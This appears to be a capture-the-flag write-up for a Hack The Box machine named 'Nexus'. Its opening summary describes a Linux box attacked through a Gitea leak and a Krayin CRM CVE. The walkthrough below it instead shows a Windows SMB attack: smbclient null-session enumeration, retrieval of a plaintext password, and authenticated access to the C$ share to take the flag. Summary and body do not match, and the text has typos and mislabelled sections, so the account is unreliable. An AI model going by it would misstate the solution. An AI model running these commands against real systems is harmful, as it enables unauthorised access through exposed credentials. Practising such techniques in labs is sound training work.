Nexus

Easy
🐧 Linux 🎯 Hack The Box 📌 Resume Evidence

Nexus is an easy-difficulty Linxux machine that features an exposed Gitea repository leaking credentials and a job posting that reveals valid usernames . The leaked credentials provide access to Krayin CRM,which is vulnerable to CVE-2026-38526, ,leading to a shell as www.data. Further enumeration of the krayin CRM configuration fiels reveals additional credentials that allow SSH access. Service enumeration reveals a Gitea tempalte sync service vulnerable to directory traversal, which is leveraged to gain shell as root.

2 Initial Access

Used smbclient to list available shares, testing for null/guest sessions before attempting any credentialed access.

terminal — smbclient share listing
# List all shares using a null session (-N)
$ smbclient -L \\\\10.10.10.exam\\ -N

Sharename       Type
---------       ----
ADMIN$          Disk
C$              Disk
IPC$            IPC
WorkShares      Disk

# Connect to the non-default, user-created share
$ smbclient \\\\10.10.10.exam\\WorkShares -N

smb: \> dir
  Amy.J          D
  James.P        D

The custom WorkShares share was accessible without credentials and contained user-named directories. Browsing further revealed a credentials file left inside one of the folders.

terminal — file retrieval
# Navigate into the user's directory and retrieve file
smb: \WorkShares\Amy.J\> get worknotes.txt
getting file \WorkShares\Amy.J\worknotes.txt
(average 10.0 kb/s)

# Inspect the file locally
$ cat worknotes.txt
reminder: temp password — Sdf#asd2021

A plaintext note inside the share contained a reusable password, which was then validated against the SMB service using the discovered username.

💡
Why this matters: Sensitive credentials stored in plaintext files on shared drives is a recurring real-world finding — exactly the kind of misconfiguration documented in SOC and penetration testing reports.
3 Privilege Escalation

Used the recovered credentials to authenticate as Amy.J and access shares not visible during the null session, including the administrative C$ share.

terminal — authenticated SMB access
# Authenticate with the recovered credentials
$ smbclient \\\\10.10.10.exam\\C$ -U Amy.J

Password: Sdf#asd2021

# Navigate to the user's desktop and retrieve the flag
smb: \> cd Users\Amy.J\Desktop
smb: \Users\Amy.J\Desktop\> get user.txt
getting file \Users\Amy.J\Desktop\user.txt

# Verify the flag
$ cat user.txt
u53r1f14g...
  • Authenticated to the privileged C$ administrative share using reused credentials found in a plaintext note
  • Retrieved the user flag from the authenticated user's desktop directory
  • Demonstrated full impact of credential reuse and insecure note storage on a shared drive
4 Key Learnings
  • SMB share enumeration is one of the first steps on any Windows target — even before attempting authentication
  • Null and guest sessions frequently expose more than expected when share permissions are misconfigured
  • Plaintext credentials in shared files are a high-severity finding in real penetration tests and SOC incident reports
  • Practiced end-to-end workflows with smbclient: null listing → unauthenticated browsing → credential recovery → authenticated access
  • Reinforced how credential reuse across services dramatically expands the blast radius of a single leaked password
